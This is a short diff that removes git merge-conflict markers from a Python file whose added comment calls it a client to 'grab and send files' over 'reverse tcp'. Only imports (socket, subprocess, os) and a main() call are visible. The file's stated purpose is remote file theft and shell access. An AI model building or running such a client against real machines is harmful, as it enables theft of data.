@@ -1,4 +1,4 @@
-<<<<<<< HEAD
+#  client grab and send files   reverse tcp
 import socket
 import subprocess
 import os
@@ -70,7 +70,7 @@ def main():
 
 
 main()
-=======
+
 import socket
 import subprocess
 import os
@@ -142,4 +142,4 @@ def main():
 
 
 main()
->>>>>>> 355bd3cdd4a98ff27bff730c062b732543f4f431
+
